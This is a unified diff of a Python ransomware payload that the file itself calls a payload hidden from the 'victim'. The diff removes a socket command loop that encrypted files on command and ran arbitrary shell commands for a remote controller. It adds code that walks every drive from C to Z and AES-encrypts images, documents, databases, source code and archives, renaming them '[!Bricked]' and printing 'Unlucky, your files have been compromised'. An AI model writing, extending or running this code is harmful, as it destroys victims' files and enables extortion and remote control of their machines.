@@ -1,4 +1,3 @@
-# Payload file - .pyw extension to hide terminal from victim.
 
 from Crypto.Hash import SHA256
 from Crypto.Cipher import AES
@@ -15,7 +14,7 @@ sysFiles = [] # all of the files found on the machine.
 
 def encrypt(key, filename):
     chunksize = 64 * 1024
-    outFile = os.path.join(os.path.dirname(filename), "[!Locked]" + os.path.basename(filename))
+    outFile = os.path.join(os.path.dirname(filename), "[!Bricked]" + os.path.basename(filename))
     filesize = str(os.path.getsize(filename)).zfill(16)
     # Initiialization vector.
     IV = ''
@@ -46,22 +45,40 @@ def encrypt(key, filename):
 # Replace getcwd with '/root' for linux machines, or traverse all drives for windows machines.
 
 def discoverFiles():
-    foundFiles = []
-    for root,subfiles,files in os.walk(os.getcwd()):
-        for names in files:
-            foundFiles.append(os.path.join(root,names))
-
-    return foundFiles
-
+    
+    Search_C_Drive()
+    Search_D_Drive()
+    Search_E_Drive()
+    Search_F_Drive()
+    Search_G_Drive()
+    Search_H_Drive()
+    Search_I_Drive()
+    Search_J_Drive()
+    Search_K_Drive()
+    Search_L_Drive()
+    Search_M_Drive()
+    Search_N_Drive()
+    Search_O_Drive()
+    Search_P_Drive()
+    Search_Q_Drive()
+    Search_R_Drive()
+    Search_S_Drive()
+    Search_T_Drive()
+    Search_U_Drive()
+    Search_V_Drive()
+    Search_W_Drive()
+    Search_X_Drive()
+    Search_Y_Drive()
+    Search_Z_Drive()
+        
 def brickSystem():
-    #c_socket.send("ENTER KEY..")
-    #key_response = C_socket.recv(1024)
-
-    C_socket.send("Finding all files..")
-    ALL_FILES = discoverFiles()
+   
+    discoverFiles() # Find all files
+    
+    ALL_FILES = sysFiles 
 
     for target_file in ALL_FILES:
-        if os.path.basename(target_file).startswith("[!Locked]"):
+        if os.path.basename(target_file).startswith("[!Bricked]"):
             pass
         elif target_file == os.path.join(os.getcwd(), sys.argv[0]):
             pass
@@ -72,24 +89,24 @@ def brickSystem():
 
 
 extensions = [
-        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
-        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
-        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
-        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
+        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES ~ ! LETHAL TO ENCRYPT !
+        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # IMAGES
+        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # AUDIO
+        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # VIDEOS 
 
         'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
-        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
-        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
-        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
+        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OFFICE FILES
+        'yml', 'yaml', 'json', 'xml', 'csv', # STRUCT DATA
+        'db', 'sql', 'dbf', 'mdb', 'iso', # DATABASES | DISC IMAGES
 
-        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
-        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
-        'java', 'class', 'jar', # java source code
-        'ps', 'bat', 'vb', # windows based scripts
-        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
-        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
+        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # WEB
+        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C-SOURCE
+        'java', 'class', 'jar', # JAVA
+        'ps', 'bat', 'vb', # WINDOW SCRIPTS
+        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # LINUX / MAC
+        'go', 'py', 'pyc', 'bf', 'coffee', # OTHER 
 
-        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
+        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # COMPRESSED FILES
 ]
 
 
@@ -314,31 +331,9 @@ def Search_Z_Drive():
 
 
 
-
-while (1):
-
-    cmd = C_socket.recv(1024)
-
-    if cmd == "quit":
-        break
-
-    if cmd == "brick":
-        C_socket.send("Encrypt the current computer database? y to continue")
-        response = C_socket.recv(1024)
-        if response == "y":
-            brickSystem()
-        else:
-            pass
-
-
+def main():
+    brickSystem()
+    Print("Unlucky, your files have been compromised")
     
 
-    # Run shell commands.
-    else:
 
-        SHELL_EXECUTE = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                         stdin=subprocess.PIPE)
-        stdout_v = SHELL_EXECUTE.stdout.read() + SHELL_EXECUTE.stderr.read()  # retreive command outputs
-        C_socket.send(stdout_v)  # send back output
-
-C_socket.close()  # Close connection.
